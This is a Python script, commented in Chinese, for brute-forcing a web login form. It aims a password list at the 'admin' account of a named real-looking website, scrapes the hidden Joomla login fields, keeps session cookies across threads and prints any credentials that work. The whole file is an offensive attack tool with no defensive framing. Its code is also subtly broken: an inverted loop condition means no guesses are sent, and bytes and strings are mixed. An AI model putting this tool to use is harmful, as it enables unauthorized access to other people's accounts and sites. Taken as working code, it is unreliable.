"""
    暴力破解 HTML 表单
"""
import urllib.request
import urllib.parse
import http.cookiejar
import threading
import queue

from html.parser import HTMLParser

user_thread = 10
username = "admin"
word_list_file = "D://password.txt"
resume = None

target_url = "https://www.xs8.com"
target_post = "https://www.xs8.com"

username_field = "username"
password_field = "password"

success_check = "Administration - Control Panel"


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = []
            tag_value = []
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value

# <input name="username"  tabindex="1"  id="mod-login-username"  type="text"
# class="input-medium"  placeholder="User Name"  size="15' />
# <input name="password"  tabindex="2"  id="mod-login-password"  type="password"
# class="input-medium"  placeholder="Password"  size="15' />
# <input type="hiden" name="option" value="com_login" />
# <input type="hiden" name="task" value="login" />
# <input type="hiden" name="return" value="aW5kZXgucGhw" />
# <input type="hiden" name="1796bae450f8430ba0d2de1656f3e0ec" value="1" />
#
# self.tag_results{ "username": ,
#                   "password": ,
#                   "option": com_login,
#                   "task": login,
#                   "return": aW5kZXgucGhw,
#                   "1796bae450f8430ba0d2de1656f3e0ec":1  }


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for:{}".format(username))

    def web_bruter(self):
        while not self.password_q.empty() and self.found:
            brute = self.password_q.get().rstrip()

            cookie = http.cookiejar.LWPCookieJar("cookies")
            handler = urllib.request.HTTPCookieProcessor(cookie)
            opener = urllib.request.build_opener(handler)
            response = opener.open(target_url)
            page_text = response.read()
            cookie.save(ignore_discard=True, ignore_expires=True)

            print("Trying: {}:{} ( {} left )".format(self.username, brute, self.password_q.qsize()))
            parser = BruteParser()
            parser.feed(page_text)
            post_tags = parser.tag_results
            post_tags[username_field] = username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print("[*] Brute force Successful")
                print("[*] Username: {}".format(self.username))
                print("[*] Password: {}".format(brute))
                print("[*] Waiting for other threads to exit....")

    def run_brute_force(self):
        for i in range(15):
            thr = threading.Thread(target=self.web_bruter)
            thr.start()


def build_word_list(the_word_list_file):
    words = queue.Queue()
    with open(word_list_file, "rb") as f:
        raw_buffer = f.readlines()
        for word in raw_buffer:
            word = word.rstrip()
            words.put(word.decode())
            # print(word.decode())
        return words


def main():
    words = build_word_list(word_list_file)
    bruter_obj = Bruter(username, words)
    bruter_obj.run_brute_force()